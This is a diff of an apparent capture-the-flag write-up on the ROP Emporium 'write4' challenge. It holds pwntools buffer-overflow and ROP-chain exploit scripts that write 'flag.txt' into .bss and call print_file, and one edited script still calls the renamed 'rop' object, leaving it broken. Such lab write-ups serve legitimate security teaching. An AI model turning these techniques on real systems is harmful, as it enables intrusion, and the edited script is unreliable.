@@ -118,6 +118,8 @@ Supported LTO compression algorithms: zlib zstd
 gcc version 13.3.0 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 
 ```
 
+You can see for yourself that pie is enabled by default with the `--enable-default-pie` flag. 
+
 Now that all binaries are compiled with pie by default, not only the shared objects, but executables are  `ET_DYN`.
 
 For executables it will be `DYN (Position-Independent Executable file)` and for shared objects it will be 
@@ -325,7 +327,7 @@ from pwn import *
 
 p = process('./write4')
 e = ELF('./write4')
-rop = ROP(e)
+r = ROP(e)
 
 pop_r14_r15_ret = 0x400690
 mov_r14_r15_ret = 0x400628
@@ -335,7 +337,7 @@ payload += p64(pop_r14_r15_ret)
 payload += p64(e.bss())
 payload += b'flag.txt'
 payload += p64(mov_r14_r15_ret)
-payload += p64(rop.find_gadget(['pop rdi']).address)
+payload += p64(r.find_gadget(['pop rdi']).address)
 payload += p64(e.bss())
 payload += p64(e.symbols['print_file'])
 p.send(payload)
@@ -479,16 +481,16 @@ from pwn import *
 
 p = process('./write4')
 e = ELF('./write4')
-rop = ROP(e)
+r= ROP(e)
 
-rop.raw(b'A'*40)
-rop.raw(rop.find_gadget(['pop r14','pop r15','ret']).address)
-rop.raw(e.bss())
-rop.raw(b'flag.txt')
-rop.raw(mov_r14_r15_ret)
-rop.raw(rop.find_gadget(['pop rdi']).address)
-rop.raw(e.bss())
-rop.call(e.symbols['print_file'])
+r.raw(b'A'*40)
+r.raw(rop.find_gadget(['pop r14','pop r15','ret']).address)
+r.raw(e.bss())
+r.raw(b'flag.txt')
+r.raw(mov_r14_r15_ret)
+r.raw(rop.find_gadget(['pop rdi']).address)
+r.raw(e.bss())
+r.call(e.symbols['print_file'])
 p.send(rop.chain())
 p.interactive()
 ```
@@ -498,13 +500,13 @@ p.interactive()
 Let's run `file` and `checksec`.
 
 ```
-$ file write432 
+$ file write432
 write432: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=7142f5deace762a46e5cc43b6ca7e8818c9abe69, not stripped
 ```
 
 ```
 $ checksec write432
-[*] '/home/hwkim301/rop_emporium/write432/write432'
+[*] '/home/hwkim301/ropemporium/write4/write432'
     Arch:       i386-32-little
     RELRO:      Partial RELRO
     Stack:      No canary found
@@ -535,7 +537,7 @@ void pwnme(void)
 }
 ```
 
-Run ROPgadget to find the necessary gadgets for the function call.
+Run `ROPgadget` to find the necessary gadgets.
 
 ```
 $ ROPgadget --binary write432 
@@ -672,7 +674,7 @@ Gadgets information
 Unique gadgets found: 127
 ```
 
-These two gadgets seem to be equivalent to the ones in the 64 bit binary. 
+These two gadgets seem to be the equivalent  32 bit versions of the ones we found in the 64 bit.  
 
 ```
 0x080485aa : pop edi ; pop ebp ; ret
@@ -735,7 +737,7 @@ from pwn import *
 
 p = process('./write432')
 e = ELF('./write432')
-rop = ROP(e)
+r = ROP(e)
 
 pop_edi_ebp_ret = 0x080485AA
 mov_edi_ebp_ret = 0x08048543
@@ -752,7 +754,7 @@ payload += b'.txt'
 payload += p32(mov_edi_ebp_ret)
 
 payload += p32(e.symbols['print_file'])
-payload += p32(rop.find_gadget(['ret']).address)
+payload += p32(r.find_gadget(['ret']).address)
 payload += p32(e.bss())
 
 p.send(payload)
@@ -767,110 +769,6 @@ First, although the buffer is `36` bytes, the offset to the return address is `4
 payload = b'A' * 40 (x)
 payload = b'A' * 44 (o)
 ```
-
-In my [previous post](https://hwkim301.com/compiling-an-empty-main-function/) I explained how the return address can be overwritten by sending the size of buffer + `4` bytes.
-
-For `x86-64` that will pretty much be correct, but for `x86` it's not always true. 
-
-Load the binary into `gdb`.
-
-Set a breakpoint on `main` with `b *main` and run the binary. 
-
-Use `disass pwnme` to see the disassembly of `pwnme`.
-
-```
-gef➤  disass pwnme
-Dump of assembler code for function pwnme:
-   0xf7fbb69d <+0>:	     push   ebp
-   0xf7fbb69e <+1>:	     mov    ebp,esp
-   0xf7fbb6a0 <+3>:	     push   ebx
-   0xf7fbb6a1 <+4>:	     sub    esp,0x24
-   0xf7fbb6a4 <+7>:	     call   0xf7fbb5a0 <__x86.get_pc_thunk.bx>
-   0xf7fbb6a9 <+12>:	add    ebx,0x1957
-   0xf7fbb6af <+18>:	mov    eax,DWORD PTR [ebx-0x8]
-   0xf7fbb6b5 <+24>:	mov    eax,DWORD PTR [eax]
-   0xf7fbb6b7 <+26>:	push   0x0
-   0xf7fbb6b9 <+28>:	push   0x2
-   0xf7fbb6bb <+30>:	push   0x0
-   0xf7fbb6bd <+32>:	push   eax
-   0xf7fbb6be <+33>:	call   0xf7fbb560 <setvbuf@plt>
-   0xf7fbb6c3 <+38>:	add    esp,0x10
-   0xf7fbb6c6 <+41>:	sub    esp,0xc
-   0xf7fbb6c9 <+44>:	lea    eax,[ebx-0x1808]
-   0xf7fbb6cf <+50>:	push   eax
-   0xf7fbb6d0 <+51>:	call   0xf7fbb540 <puts@plt>
-   0xf7fbb6d5 <+56>:	add    esp,0x10
-   0xf7fbb6d8 <+59>:	sub    esp,0xc
-   0xf7fbb6db <+62>:	lea    eax,[ebx-0x17f1]
-   0xf7fbb6e1 <+68>:	push   eax
-   0xf7fbb6e2 <+69>:	call   0xf7fbb540 <puts@plt>
-   0xf7fbb6e7 <+74>:	add    esp,0x10
-   0xf7fbb6ea <+77>:	sub    esp,0x4
-   0xf7fbb6ed <+80>:	push   0x20
-   0xf7fbb6ef <+82>:	push   0x0
-   0xf7fbb6f1 <+84>:	lea    eax,[ebp-0x28]
-   0xf7fbb6f4 <+87>:	push   eax
-   0xf7fbb6f5 <+88>:	call   0xf7fbb580 <memset@plt>
-   0xf7fbb6fa <+93>:	add    esp,0x10
-   0xf7fbb6fd <+96>:	sub    esp,0xc
-   0xf7fbb700 <+99>:	lea    eax,[ebx-0x17ec]
-   0xf7fbb706 <+105>:	push   eax
-   0xf7fbb707 <+106>:	call   0xf7fbb540 <puts@plt>
-   0xf7fbb70c <+111>:	add    esp,0x10
-   0xf7fbb70f <+114>:	sub    esp,0xc
-   0xf7fbb712 <+117>:	lea    eax,[ebx-0x17c3]
-   0xf7fbb718 <+123>:	push   eax
-   0xf7fbb719 <+124>:	call   0xf7fbb510 <printf@plt>
-   0xf7fbb71e <+129>:	add    esp,0x10
-   0xf7fbb721 <+132>:	sub    esp,0x4
-   0xf7fbb724 <+135>:	push   0x200
-   0xf7fbb729 <+140>:	lea    eax,[ebp-0x28]
-   0xf7fbb72c <+143>:	push   eax
-   0xf7fbb72d <+144>:	push   0x0
-   0xf7fbb72f <+146>:	call   0xf7fbb500 <read@plt>
-   0xf7fbb734 <+151>:	add    esp,0x10
-   0xf7fbb737 <+154>:	sub    esp,0xc
-   0xf7fbb73a <+157>:	lea    eax,[ebx-0x17c0]
-   0xf7fbb740 <+163>:	push   eax
-   0xf7fbb741 <+164>:	call   0xf7fbb540 <puts@plt>
-   0xf7fbb746 <+169>:	add    esp,0x10
-   0xf7fbb749 <+172>:	nop
-   0xf7fbb74a <+173>:	mov    ebx,DWORD PTR [ebp-0x4]
-   0xf7fbb74d <+176>:	leave
-   0xf7fbb74e <+177>:	ret
-End of assembler dump.
-```
-
-Unlike the prologue from the other `x86-64` binaries, due to lack of registers there is a `push ebx`.
-
-```
-   0xf7fbb69d <+0>:	     push   ebp
-   0xf7fbb69e <+1>:	     mov    ebp,esp
-   0xf7fbb6a0 <+3>:	     push   ebx
-   0xf7fbb6a1 <+4>:	     sub    esp,0x24
-```
-
-Therefore although the buffer is `36` bytes the compiler allocates `40` bytes. 
-
-Before the `read` syscall you can see that it uses `0x28` bytes.
-
-```
-   0xf7fbb729 <+140>:	lea    eax,[ebp-0x28]
-```
-
-I'm not an expert on ghidra, but that seems to be the reason why ghidra displays the pseudocode like this. 
-
-The `2c` which probably stands for `0x2c` is `44`.
-
-```c
-undefined1 local_2c [36];
-```
-
-It looks like ghidra does the offset calculation so we don't have to manually calculate it by inspecting `gdb`.
-
-I didn't use `objdump` because `objdump` will only show the process before dynamic linking. 
-
-Therefore we won't be able to inspect the actual byte size that will be used.
 
 If you have `gef` installed, `gef` can create a [de-bruijn](https://en.wikipedia.org/wiki/De_Bruijn_sequence) sequence. 
 
@@ -937,11 +835,9 @@ gef➤  pattern search $eip
 [+] Found at offset 44 (little-endian search) likely
 ```
 
-The lesson from calculating the actual offset to the return address was that sending dummy `4` bytes the buffer might not always be correct. 
+The lesson from calculating the actual offset to the return address was that sending dummy `4` bytes the buffer might not always be correct if GCC optimizes the stack. 
 
-The compiler might add extra bytes especailly if it's `x86`.
-
-So always double check to calculate the offset precisely. 
+So always double check in order to calculate the offset precisely. 
 
 Second, we can't actually pass `flag.txt` in one instruction. 
 
@@ -957,13 +853,15 @@ payload += b'.txt'
 payload += p32(mov_edi_ebp_ret)
 ```
 
-We can only pass `4` characters or bytes because this is a `32` bit binary. 
+We can only pass 4 characters/bytes because this is a `32` bit binary. 
 
 In order to store `flag.txt` into the `bss`, we'll need to split the flag into two parts `flag` and `.txt`.
 
 Also be aware when storing `.txt` that you'll need to save `e.bss() + 4`.
 
-This is necessary beacuse the first `4` bytes of the `bss` stores `flag`.
+This is necessary beacuse the first 4 bytes of the `bss` stores `flag`.
+
+The latter 4 bytes will save `.txt`. 
 
 The last part is the most confusing part. 
 
@@ -973,36 +871,13 @@ payload += p32(rop.find_gadget(['ret']).address)
 payload += p32(e.bss())
 ```
 
-In ROP we are always calling the function with the `ret` instruction instead of `CALL`.
+Unlike x86-64, x86 searches for arguments on the stack. 
 
-![ret](ret.webp)
-
-`CALL` pushes the return address before the function call, which continues program execution even after the function call.
-
-However, `ret` only pops the return instruction pointer off the stack and will continue executing.
-
-Thus, if we wrote code like this.
-
-The program would get confused and get a `SIGSEGV`, right after `print_file`'s function epilogue because the return address doesn't exist.
-
-```python 
-payload += p32(e.symbols['print_file'])
-payload += p32(e.bss())
-```
-
-By adding a `ret` instruction the instruction pointer can continue program execution.
-
-Another interesting point is that unlike `x86-64` where setting the arguments and calling the function are completely separated,
-
-in `x86` it feels as if we're calling the function while simultaneously setting the arguments. 
-
-In `x86-64` we had to prepare the arguments first by using the `pop r*i` + `ret` and then trigger the function call.
-
-However, in `x86` as you can see the it looks almost as if the function call and preparing the argument seem to work concurrently.
+I've already discussed why you'll need to pass the address of the function first in your pwnools code [here](https://github.com/hwkim301/ROP-Emporium/blob/master/callme/callme.md#callme32).
 
 Here's the version using the rop class from pwntools. 
 
-Since the rop class couldn't automatically find the mov_edi_ebp gadget it's not much of an advanatage...
+The rop class couldn't automatically find the `mov_edi_ebp` gadget. 
 
 I recommend manually crafting the ropchain, especially for 32 bit binaries.
 
@@ -1011,26 +886,26 @@ from pwn import *
 
 p = process('./write432')
 e = ELF('./write432')
-rop = ROP(e)
+r = ROP(e)
 
 pop_edi_ebp_ret = 0x080485AA
 mov_edi_ebp_ret = 0x08048543
 
-rop.raw(b'A' * 44)
-rop.raw(pop_edi_ebp_ret)
-rop.raw(e.bss())
-rop.raw(b'flag')
-rop.raw(mov_edi_ebp_ret)
+r.raw(b'A' * 44)
+r.raw(pop_edi_ebp_ret)
+r.raw(e.bss())
+r.raw(b'flag')
+r.raw(mov_edi_ebp_ret)
 
-rop.raw(pop_edi_ebp_ret)
-rop.raw(e.bss() + 4)
-rop.raw(b'.txt')
-rop.raw(mov_edi_ebp_ret)
+r.raw(pop_edi_ebp_ret)
+r.raw(e.bss() + 4)
+r.raw(b'.txt')
+r.raw(mov_edi_ebp_ret)
 
-rop.raw(e.symbols['print_file'])
-rop.raw(rop.find_gadget(['ret']).address)
-rop.raw(e.bss())
+r.raw(e.symbols['print_file'])
+r.raw(r.find_gadget(['ret']).address)
+r.raw(e.bss())
 
-p.send(rop.chain())
+p.send(r.chain())
 p.interactive()
 ```
